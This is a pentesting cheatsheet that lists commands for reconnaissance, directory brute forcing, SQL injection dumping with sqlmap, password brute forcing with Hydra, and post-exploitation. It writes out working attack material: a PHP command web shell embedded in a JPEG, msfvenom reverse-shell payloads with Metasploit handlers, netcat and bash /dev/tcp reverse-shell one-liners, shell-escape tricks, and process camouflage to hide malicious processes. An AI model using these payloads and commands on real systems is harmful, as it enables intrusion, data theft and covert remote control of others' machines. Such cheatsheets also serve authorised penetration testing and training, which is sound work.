# Pentesting Cheatsheet

## Footprinting and Enumeration


### Nikto
#### Run nikto scan
```
nikto -host <host>

-host: Host to target with IP address, hostname or text file of hosts.
```


### Nmap 
#### Scan remote host with TCP scan:
```
nmap -PS A -v <remote_host> > file.txt

or

nmap -sV -v <remote_host>

-A: Enable OS detection, version detection, script scanning, and traceroute
-sV: Probe to detect open ports and services.
-v: Verbose.
-PS: TCP services scan.
```

example:

```
nmap -PS A -v 10.10.10.21 > file.txt
```
#### Scan remote host with UDP scan:
```
nmap -sU -sV --top-ports <top_ports> <rhost>
```

example:
```
nmap -sU -sV --top-ports 100 10.10.10.21
```

#### Scan remote host with script scan:
```
nmap <ip> --script=<script>
```

example:
```
nmap 10.10.10.14 --script=http-webdav-scan
```

More scripts found in /usr/share/nmap/scripts. For instance, http-enum.nse enumerates directories used by popular web applications and servers

#### Scan with forced port scan (for hosts that don't allow probes):
```
nmap -PS <ip> -P0
```

example:
```
nmap -PS 10.10.10.14 -P0
```

### Masscan
(Requires installation). Scanner that is regularly quicker than nmap, but is noisy and more detectable. 
```
cd /usr/share/masscan/bin
./masscan -e tun0 -p<1-65535> <ip>

-e: interface
-p: port range as list
```

example
```
./masscan -e tun0 -p1-65535 10.10.10.21
```

### PortWitness
Requires installation available at: https://github.com/viperbluff/PortWitness 
Note: This tool requires sublist3r as prerequisite (https://github.com/aboul3la/Sublist3r)

#### Find active domains and subdomains
```
python2 name.py url
```


### Dirb
#### Search for hidden directories using wordlists:
```
dirb <target_host>
```

example:
```
dirb http://10.10.10.100/ 
```

### Dirsearch
#### Enumerate directories using wordlists
Python3 implementation of a directory enumerator. Obtain from: https://github.com/maurosoria/dirsearch. Once cloned run as:
```
python3 dirsearch.py -u <url> -fe php -t 25 -w /path/to/wordlist.txt

-u: URL
-fe: file search
-w: wordlist path
-t: Number of threads
```

example:
```
python3 dirsearch.py -u domain.com -fe php -t 10 -w /usr/share/dirbuster/wordlist/directory-list-2.3-medium.txt
```

### Gobuster
#### Enumerate directories using wordlists
```
gobuster -u <URL> -x php -w /path/to/wordlist.txt

-u: URL
-x: file type search
-w: wordlist path
```

example:
```
gobuster -u domain.com -x php -w /usr/share/dirbuster/wordlist/directory-list-2.3-medium.txt
```
### Metasploit dirscanner
#### Directory search:
```
msfv> use auxiliary/scanner/http/dir_scanner
msfv> set threads THREADS
msfv> set rhost RHOST
msfv> run
```

### Wfuzz
#### Website fuzzing
Replace the word "FUZZ" in a URL with words from a wordlist.
```
wfuzz -c -z <file,wordlist> --hc=<CODE> <URL/FUZZ>

-c: output with colors
-z: Payload in the form of file,wordlist
--hc: Hide responses with specific code
```

example for folders:
```
wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt --hc=404 http://10.10.10.14/FUZZ/
```
example for php files:
```
wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt --hc=404 http://10.10.10.14/FUZZ.php
```
### Whatweb
#### website fingerprinting
```
whatweb -v -a <1,3,4> <IP>

-v: verbose mode
-a: agression level from 1 (stealthy), 3 (Aggressive), or 4 (Heavy)
```

example:
```
whatweb -v -a 3 192.168.0.102
```

### Dig
#### Name server query on a domain.
```
dig <domain> -t ns
```

example:
```
dig domain.com -t ns
```

#### Transfer zone request with no comments:

Use axfr record to find zone transfers in a domain. 
```
dig axfr <domain> @<name-server> +nocmd +nocomments +nostat 
```

example:

Perform a zone trasnfer query on server 10.10.10.14 running DNS on port 53. 
```
dig axfr domain.com @10.10.10.14 +nocmd +nocomments +nostat 
```

### Host
#### Use "host" linux native comand for name server queries. 
```
host -t ns <domain>
```
example:
```
host -t ns domain.com
```

#### List zone trasnfers (if available)
```
host -l <domain> <name-server> 
```
<name-server> can be obtained from the step above. 
 
 example:
```
host -t domain.com ns1.domain.svr
```

### Nslookup
#### Name server query
```
$ nslookup
> set type=ns
> <domain>
```

example:
```
$ nslookup
> set type=ns
> mydomain.com
```
The above should return a list of name servers (if allowed). 

### Sqlmap
#### Probe site for sql injection vulnerabilities
```
sqlmap -u <URL> --dbms=<database_type>
```

example:
```
sqlmap -u domain.com/login.php --data="user=admin&pass=test" --dbms=sql
```

#### Perform enumeration through injection
```
sqlmap -u <URL> --dbms=<database_type> --<param>
 
<param>: Any retrievable param like users, paswords, privileges, roles, dbs, tables, form. etc.
```

Enumerate users example:
```
sqlmap -u domain.com/admin.php --dbms=sql --users
```

Enumerate tables example:
```
sqlmap -u domain.com/admin.php --dbms=sql -D myDB --tables
```

Enumerate columns in table example:
```
sqlmap -u domain.com/admin.php --dbms=sql -D myDB -T my_table --columns 
```

Dump database example:
```
sqlmap -u domain.com/admin.php --dbms=sql -D myDB --dump

Note: -D option specifies the database name and can be combined with --dump to dump the entire database.
```

Dump columns contents from table example:
```
sqlmap -u domain.com/admin.php --dbms=sql -D myDB -T my_table -C col_1,col2 --dump
```
 
 ### SQL injection cheatsheet
 https://portswigger.net/web-security/sql-injection/cheat-sheet

### DNS Recon
#### Enumerate all records of a DNS server
```
dnsrecon -d <domain>
```

### Drupwn
#### Enumerate Drupal sites (Requires install)
```
drupwn enum <http://URL>   
```

example:
```
drupwn enum http://10.10.10.12
```

### Droopescan
#### Enumerate Drupal sites (Requires install)
```
./droopescan scan -u <http://URL>   
```

example:
```
./droopescan scan -u http://10.10.10.23
```

### Wpscan
#### Enumerate wordpress sites
```
wpscan -u <http://URL> --enumerate p --enumerate u --enumerate p

--enumerate: Enumerate users (u), plugins (p), themes (t)
```

### Joomscan
#### Enumerate joomla sites
```
perl joomscan.pl -u <url> 
```

### LinEnum
#### Linux Enumeration:
Can be found at http://github.com/Z3R0th-13/LinEnum. (Requires upload to existing shell in target)

Upload with netcat:
```
On receiving host:

nc -lp LPORT > enum.sh

LPORT is the lostening port of the receiving machine.

```

```
On sender:

nc RHOST RPORT < enum.sh
```

Make enum.sh executable on remote and run:
```
chmod +x enum.sh
./enum.sh
```

### Linuxprivchecker
#### Linux Enumeration: 
Can be found at https://github.com/ankh2054/linux-pentest/blob/master/linuxprivchecker.py. (Requires upload to existing shell target). 

Upload with netcat:
```
On remote host:

nc LHOST LPORT -w3 > linpriv.py

LHOST and LPORT are the address and port of your client machine.
```

```
On Client:

nc RHOST RPORT < linuxprivchecker.py
```

Run:
```
python linpriv.py
```
### Native search for SUID and SGID
SUID under root:
```
find / -perm +4000
```
SGID under root:
```
find / -perm +2000
```
Both:
```
find / -type f \( -perm -4000 -o -perm -2000 \) -exec ls -l {} \;
```

### JAWS windows enumeration
#### Windows Enumeration
Can be found at: https://github.com/411Hall/JAWS/blob/master/jaws-enum.ps1. (Requires upload to existing shell target)

After uploading, run in victim:
```
powershell.exe -ExecutionPolicy Bypass - File ./jaws.ps1 -OutputFilename win_enum.txt
```

Note: This ps script doesn't say when it's done so maybe add that before uploading to target. 

Once is done read file output:
```
type win_enum.txt
```

## Postexploitation and Payloads

### Covenant
Covenant is a .NET command and control framework that aims to highlight the attack surface of .NET, make the use of offensive .NET tradecraft easier, and serve as a collaborative command and control platform for red teamers.

Covenant is an ASP.NET Core, cross-platform application that includes a web-based interface that allows for multi-user collaboration.

https://github.com/cobbr/Covenant

### RuralBishop (formerly UrbanBishop)
RuralBishop is practically a carbon copy of UrbanBishop by b33f, but all P/Invoke calls have been replaced with D/Invoke.

RuralBishop can inject malicious payload into windows processes at runtime and execute the paylad. Works well with payloads generated by covenant.

https://github.com/rasta-mouse/RuralBishop

### Shellter

Shellter is a dynamic shellcode injection tool aka dynamic PE infector. It can
be used in order to inject shellcode into native Windows applications
(currently 32-bit apps only). The shellcode can be something yours or something
generated through a framework, such as Metasploit.

 Works well with payloads generated by covenant.

https://github.com/ParrotSec/shellter

### cpscam
Is a useful aid for impersonating an authenticated client and bypassing the captive portal authentication process

https://github.com/codewatchorg/cpscam

### CUPP
#### Generate password based on user profiling
GitRepo: https://github.com/Mebus/cupp
Interactive mode where you answer questions about the user to generate the password list
```
python3 cupp.py -i
```

### Hydra
#### Perform authentication requests using a passwrod list

Example with posts requests
```
hydra -l <USERNAME> -P <PASSWORD_LIST> -vV -f -t 5 <SOME_IP> http-post-form "/secret.php:username=^USER^&password=^PASS^:<LOGGIN_ERROR>"
```

### Cadaver
#### Exploit hosts that support http methods: 
```
cadaver <ip>

...(If successful) Upload webshells from cadaver shell:
put <payload> payload.txt
```
Tip: use .txt extension to avoid execution on upload and rename later.

example
```
cadaver 10.10.10.55

...(new shell)
dav:/> put /usr/share/webshells/php/php-reverse-php.php my_shell.php
dav:/> mv my_shell.txt my_shell.php
```

### MSFvenom
#### Create payload with MSFvenom
```
msfvenom -p <payload> LHOST=<lhost> LPORT=<lport> -f <file_type> > payload.file_type

-p: Dir path to payload
LHOST: Listening host ip address
LPORT: Listening port
-f: File type for the payload e.g asp, aspx, php
```

asp payload example:
```
msfvenom -p windows/shell/reverse_tcp LHOST=10.10.14.2 LPORT=2222 -f exe > my_payload.exe
```

Metasploit payload example: 
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=2222 -f asp > my_payload.asp

... (Needs listener on metasploit)
```

### Metasploit listener
```
metasploit
msfv> use exploit/multi/handler
msfv> set payload /windows/meterpreter/reverse_tcp
msfv> set LHOST lhost
msfv> set LPORT lport
msfv> run
```

## Steganography

### Jhead
#### Embed code into jpeg files:
Assuming jhead is already installed, first, clean up the headers:
```
./jhead -purejpg <image.jpg>
```

Then, add flag to add code execution on jpg image from editor:
```
./jhead -ce <image.jpg>
```

Sample php script:
```
<style>body{font-size: 0;}h1{font-size: 12px}</style><h1><?php if(isset($_REQUEST['cmd'])){system($_REQUEST['cmd']);}else{echo '<img src="./clean_image.jpg" border=0>';}__halt_compiler();?></h1>
```

Rename file to include php extension:
```
mv <image.jpg> <image.php.jpg>
```

example:
```
./jhead -purejpg my_image.jpg
./jhead -ce my_image.jpg

.... (copy sample script to my_image.jpg)

mv my_image.jpg my_image.php.jpg 

... (Upload and test on domain.com)

http://domain.com/my_image.php.jpg?cmd=nc -lvnp 2222 -e /bin/bash
```
## Network Tools
### Ettercap
Ettercap is a comprehensive suite for man in the middle attacks. It features sniffing of live connections, content filtering on the fly and many other interesting tricks. It supports active and passive dissection of many protocols and includes many features for network and host analysis.

https://www.ettercap-project.org/

## Misc

### Get python promp from existing reverseshell
```
python -c 'import pty; pty.spawn("/bin/bash")'
```

### Netcat 
Start Listener:
```
nc -lvnp <LPORT>
```

Connect to Listener with bash (if nc version supports -e):
```
nc <LHOST> <LPORT> -e /bin/bash
```
or (with no /):
```
nc <LHOST> <LPORT> -c bash
```
### Start python simple server
```
python -m SimpleHTTPServer PORT
```
### Mimic
#### Hide malicious process in Linux by pretending to be a different one.
Project info at: https://github.com/emptymonkey/mimic
Mimic a process with mimic's default camouflage (apache2 service)
```
./mimic -e <process>
```

Mimic with user specified process:
```
./mimic -e <process> -m <camouflage>
```

example:
```
./mimic -e /bin/bash
```
```
./mimic -e /bin/bash -m "lib/systemd/systemd --user"
```

### Metasploit exploit suggester
1) Create a metasploit reverse shell payload
```
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf > rev.elf
```

2) Upload the payload to the victim and give execution privileges. 

3) Set meterpreter handler
```
msf> use exploit/multi/handler
msf> set payload linux/x64/meterpreter/reverse_tcp
msf> set LHOST <LHOST>
msf> set LPORT <LPORT>
msf> exploit
```

4) Back on the targe machine run the exploit:
```
$ ./rev_metasploit.elf
```

5) Run the exploit suggester on reverse handler:
```
meterpreter> background
msf> use post/multi/recon/local_exploit_suggester
msf> set SESSION <SESS> (normally 1)
msf> run
```
6) Shell escaping sequences:
```
vi-->	:!bash
vi-->	:set shell=/bin/bash:shell
awk-->	awk 'BEGIN {system("/bin/bash")}'
find-->	find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' \;
perl-->	perl -e 'exec "/bin/bash";'
````

7) Python oneliner reverse shell (inline with code):
```
__import__('os').system('bash -i >& /dev/tcp/xx.xx.xx.xx/XXXX 0>&1')
```

<!-- Special mentions:
Blue teaming:
osquery  - Detect inconsistencies of hidden malicious processes, PoC in Haking9/mimic documentation
yara - same as above 
-->

